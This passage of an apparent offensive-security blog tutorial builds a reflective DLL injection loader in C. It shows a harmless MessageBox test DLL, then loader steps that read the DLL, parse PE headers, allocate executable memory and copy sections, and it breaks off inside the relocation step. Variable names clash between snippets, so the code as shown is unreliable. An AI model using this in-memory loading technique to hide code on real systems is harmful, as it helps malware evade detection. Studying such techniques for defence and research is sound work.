https://blog.malicious.group/content/images/size/w1600/2023/04/image-4.png 1600w, https://blog.malicious.group/content/images/2023/04/image-4.png 2175w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>The following code should go into <code>main.c</code> to create and export the <code>DllMain()</code> function within the DLL file.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>main.c</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/c6316f20a28d72ebb83398960ef6182d.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121768975" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-main-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="main.c">
        <tbody><tr>
          <td id="file-main-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-main-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-main-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-main-c-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-main-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DLLEXPORT</span>   <span class="pl-en">__declspec</span>( dllexport )</td>
        </tr>
        <tr>
          <td id="file-main-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-main-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-main-c-LC5" class="blob-code blob-code-inner js-file-line">DLLEXPORT BOOL DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);</td>
        </tr>
        <tr>
          <td id="file-main-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-main-c-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-main-c-LC7" class="blob-code blob-code-inner js-file-line">BOOL APIENTRY <span class="pl-en">DllMain</span>( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-main-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">switch</span> (ul_reason_for_call) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-main-c-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DLL_PROCESS_ATTACH:</td>
        </tr>
        <tr>
          <td id="file-main-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-main-c-LC10" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">MessageBoxA</span>(<span class="pl-c1">NULL</span>, <span class="pl-s"><span class="pl-pds">"</span>DLL PROCESS ATTACH<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>Bingo!<span class="pl-pds">"</span></span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-main-c-LC11" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-main-c-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DLL_THREAD_ATTACH:</td>
        </tr>
        <tr>
          <td id="file-main-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-main-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DLL_THREAD_DETACH:</td>
        </tr>
        <tr>
          <td id="file-main-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-main-c-LC14" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">case</span> DLL_PROCESS_DETACH:</td>
        </tr>
        <tr>
          <td id="file-main-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-main-c-LC15" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">default</span>:</td>
        </tr>
        <tr>
          <td id="file-main-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-main-c-LC16" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-main-c-LC17" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-main-c-LC18" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-main-c-LC19" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/c6316f20a28d72ebb83398960ef6182d/raw/361207b105cd9db50ea9d20351a16ffeb72ec525/main.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/c6316f20a28d72ebb83398960ef6182d#file-main-c">
          main.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>To make sure we compile this into a DLL instead of a EXE we need to modify the <code>CMakeLists.txt</code> file located in the project root directory.  The file should look like the following.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>CMakeLists.txt</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/91a0348913da57cf8dbbf526ea4e9fed.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121769123" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-cmakelists-txt" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-cmake  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="CMake" data-tagsearch-path="CMakeLists.txt">
        <tbody><tr>
          <td id="file-cmakelists-txt-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cmakelists-txt-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">cmake_minimum_required</span>(<span class="pl-k">VERSION</span> 3.24)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cmakelists-txt-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">project</span>(dll_poc C)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cmakelists-txt-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cmakelists-txt-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(CMAKE_C_STANDARD 17)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cmakelists-txt-LC5" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cmakelists-txt-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> add_executable(dll_poc main.c)</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cmakelists-txt-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(CMAKE_SHARED_LIBRARY_PREFIX <span class="pl-s">""</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cmakelists-txt-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">add_library</span>(dll_poc <span class="pl-k">SHARED</span> main.c)</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/91a0348913da57cf8dbbf526ea4e9fed/raw/6099d41e9561c5ca595ebfd922882f94f27f0d6e/CMakeLists.txt" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/91a0348913da57cf8dbbf526ea4e9fed#file-cmakelists-txt">
          CMakeLists.txt
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Now with both files above modified, we can go ahead and build the project which should create a <code>dll_poc.dll</code> file within the generic <code>cmake-debug-build</code> directory.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-5.png" class="kg-image" alt="" loading="lazy" width="2000" height="1073" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-5.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-5.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-5.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-5.png 2400w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>With the <code>dll_poc.dll</code> file created, we can quickly test to make sure the <code>DllMain</code> function works without error by using <code>rundll32</code>.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-6.png" class="kg-image" alt="" loading="lazy" width="1807" height="1199" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-6.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-6.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-6.png 1600w, https://blog.malicious.group/content/images/2023/04/image-6.png 1807w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>With the DLL done, I am going to copy the DLL to <code>C:/Temp/</code> for easy testing.</p><!--kg-card-end: html--><!--kg-card-begin: html--><pre>cp .\cmake-build-debug\dll_poc.dll C:\Temp\
</pre><!--kg-card-end: html--><hr><p></p><h2 id="basic-rdi-loader">Basic RDI Loader</h2><p></p><!--kg-card-begin: html--><p>With the DLL compiled and moved to <code>C:/Temp/</code>, it is time to start working on the loader, so again I will start by creating a new C project called <code>dll_loader</code> as seen in the following example.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image.png" class="kg-image" alt="" loading="lazy" width="2000" height="1624" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image.png 1600w, https://blog.malicious.group/content/images/2023/04/image.png 2002w" sizes="(min-width: 720px) 720px"></figure><p>After the new project has been created, open up a terminal within the IDE <code>Alt + F12</code> and create the following folders. &nbsp;Depending on which command interpreter you are using with <em>CLion</em>, will determine which commands you will run in the following steps.</p><hr><h3 id="make-required-folders">Make required folders</h3><p></p><p></p><div class="kg-card kg-callout-card kg-callout-card-blue"><div class="kg-callout-emoji">üñ•Ô∏è</div><div class="kg-callout-text">Powershell</div></div><!--kg-card-begin: html--><pre>New-Item -ItemType Directory -Force -Path "src\c","src\h","src\masm"
</pre><!--kg-card-end: html--><hr><div class="kg-card kg-callout-card kg-callout-card-green"><div class="kg-callout-emoji">üñ•Ô∏è</div><div class="kg-callout-text">Cmd</div></div><!--kg-card-begin: html--><pre>mkdir src\c src\h src\masm
</pre><!--kg-card-end: html--><hr><p>Once the folders above have been setup, the IDE file browser should look like the following image.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-2.png" class="kg-image" alt="" loading="lazy" width="2000" height="1253" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-2.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-2.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-2.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-2.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Now with the directories created, it is time to populate them with a few files using the following commands.</p><hr><h3 id="make-required-files">Make required files</h3><p></p><p></p><div class="kg-card kg-callout-card kg-callout-card-blue"><div class="kg-callout-emoji">üñ•Ô∏è</div><div class="kg-callout-text">Powershell</div></div><!--kg-card-begin: html--><pre>New-Item -ItemType File -Path "src/c/peb.c", "src/h/peb.h", "src/masm/peb.masm"
New-Item -ItemType File -Path "src/h/defs.h", "src/h/structs.h"
</pre><!--kg-card-end: html--><hr><div class="kg-card kg-callout-card kg-callout-card-green"><div class="kg-callout-emoji">üñ•Ô∏è</div><div class="kg-callout-text">Cmd</div></div><!--kg-card-begin: html--><pre>echo.&gt;src\c\peb.c
echo.&gt;src\h\peb.h
echo.&gt;src\masm\peb.masm
copy /b src\c\peb.c+,, src\h\peb.h+,, src\masm\peb.masm+,
echo.&gt;src\h\defs.h
echo.&gt;src\h\structs.h
</pre><!--kg-card-end: html--><hr><p>After running the above commands to setup some blank files in their respective directories, you should see a file layout like the one in the below image.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-7.png" class="kg-image" alt="" loading="lazy" width="2000" height="1359" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-7.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-7.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-7.png 1600w, https://blog.malicious.group/content/images/2023/04/image-7.png 2142w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>Having created all the necessary file stubs, the next step is to create a basic DLL injection using <code>main.c</code>. For now, we'll use the example from ired.team which uses what I consider "high-level" Windows API functions to ensure the logic is sound. Once this is confirmed, we can move on to refining and optimizing the code.</p><!--kg-card-end: html--><hr><h3 id="basicstep-1">Basic - Step 1</h3><p>In this step, the binary representation of the DLL file is read from the file...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/6b918ef973d1687867beb1799d49f958.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787098" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-1-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-1.c">
        <tbody><tr>
          <td id="file-basic-step-1-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-1-c-LC1" class="blob-code blob-code-inner js-file-line">HANDLE dll = CreateFileA(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>??<span class="pl-cce">\\</span>C:<span class="pl-cce">\\</span>Temp<span class="pl-cce">\\</span>dll_poc.dll<span class="pl-pds">"</span></span>, GENERIC_READ, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>, OPEN_EXISTING, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-1-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-1-c-LC2" class="blob-code blob-code-inner js-file-line">DWORD64 dll_size = GetFileSize(dll, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-1-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-basic-step-1-c-LC3" class="blob-code blob-code-inner js-file-line">LPVOID dll_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);</td>
        </tr>
        <tr>
          <td id="file-basic-step-1-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-basic-step-1-c-LC4" class="blob-code blob-code-inner js-file-line">DWORD out_size = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-basic-step-1-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-basic-step-1-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-en">ReadFile</span>(dll, dll_bytes, dll_size, &amp;out_size, <span class="pl-c1">NULL</span>);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/6b918ef973d1687867beb1799d49f958/raw/d1d305cdf73a41f50b40ece829223bb884bec33c/basic-step-1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/6b918ef973d1687867beb1799d49f958#file-basic-step-1-c">
          basic-step-1.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>This code uses the <code>CreateFileA</code> function to open the DLL for reading, then allocates some space on the heap using <code>HeapAlloc</code> which will store the file being read by <code>ReadFile</code>.</p><!--kg-card-end: html--><hr><h3 id="basicstep-2">Basic - Step 2</h3><p>The PE header of the DLL file is parsed to extract important information...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/b2e932d44084b77df667f1b6cd492e2a.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787151" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-2-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-2.c">
        <tbody><tr>
          <td id="file-basic-step-2-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-2-c-LC1" class="blob-code blob-code-inner js-file-line">PIMAGE_DOS_HEADER dos_headers = (PIMAGE_DOS_HEADER)dll_bytes;</td>
        </tr>
        <tr>
          <td id="file-basic-step-2-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-2-c-LC2" class="blob-code blob-code-inner js-file-line">PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dll_bytes + dos_headers-&gt;e_lfanew);</td>
        </tr>
        <tr>
          <td id="file-basic-step-2-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-basic-step-2-c-LC3" class="blob-code blob-code-inner js-file-line">SIZE_T dllImageSize = nt_headers-&gt;OptionalHeader.SizeOfImage;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/b2e932d44084b77df667f1b6cd492e2a/raw/3e06f740b6f0a9c828e024c6599e59a624836871/basic-step-2.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/b2e932d44084b77df667f1b6cd492e2a#file-basic-step-2-c">
          basic-step-2.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><p>This code uses the <code>PIMAGE_DOS_HEADER</code> and <code>PIMAGE_NT_HEADERS</code> structures to find the size of the DLL file, which is stored in the <code>nt_headers-&gt;OptionalHeader.SizeOfImage</code> member variable.</p><hr><h3 id="basicstep-3">Basic - Step 3</h3><p>Memory is allocated in the address space of the target process to hold the binary...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/d7b2b675d4474d7d7a4b2ed9f1f034f5.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787183" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-3-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-3.c">
        <tbody><tr>
          <td id="file-basic-step-3-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-3-c-LC1" class="blob-code blob-code-inner js-file-line">LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-3-c-LC2" class="blob-code blob-code-inner js-file-line">DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-basic-step-3-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-en">memcpy</span>(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-basic-step-3-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-basic-step-3-c-LC5" class="blob-code blob-code-inner js-file-line">PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-basic-step-3-c-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-k">for</span> (<span class="pl-c1">size_t</span> i = <span class="pl-c1">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) {</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-basic-step-3-c-LC7" class="blob-code blob-code-inner js-file-line">    LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dll_base + (DWORD_PTR)section-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-basic-step-3-c-LC8" class="blob-code blob-code-inner js-file-line">    LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dll_bytes + (DWORD_PTR)section-&gt;<span class="pl-smi">PointerToRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-basic-step-3-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(sectionDestination, sectionBytes, section-&gt;<span class="pl-smi">SizeOfRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-basic-step-3-c-LC10" class="blob-code blob-code-inner js-file-line">    section++;</td>
        </tr>
        <tr>
          <td id="file-basic-step-3-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-basic-step-3-c-LC11" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/d7b2b675d4474d7d7a4b2ed9f1f034f5/raw/3476670b535fdb90352592a6f78094039eb7823c/basic-step-3.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/d7b2b675d4474d7d7a4b2ed9f1f034f5#file-basic-step-3-c">
          basic-step-3.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>This code is responsible for copying the sections of the DLL from the file on disk into the memory block previously allocated for the DLL.  It does this by using the <code>PIMAGE_SECTION_HEADER</code> and <code>IMAGE_FIRST_SECTION</code> structures to iterate over each section to be copied to allocated memory.</p><!--kg-card-end: html--><hr><h3 id="basicstep-4">Basic - Step 4</h3><p>The loader performs any necessary relocation fixups on the executable. Relocation...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/4173e4d5e374840c6114c6814a9a5ae7.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121787223" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-basic-step-4-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="basic-step-4.c">
        <tbody><tr>
          <td id="file-basic-step-4-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-basic-step-4-c-LC1" class="blob-code blob-code-inner js-file-line">IMAGE_DATA_DIRECTORY relocations = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-basic-step-4-c-LC2" class="blob-code blob-code-inner js-file-line">DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dll_base;</td>
        </tr>
        <tr>
          <td id="file-basic-step-4-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
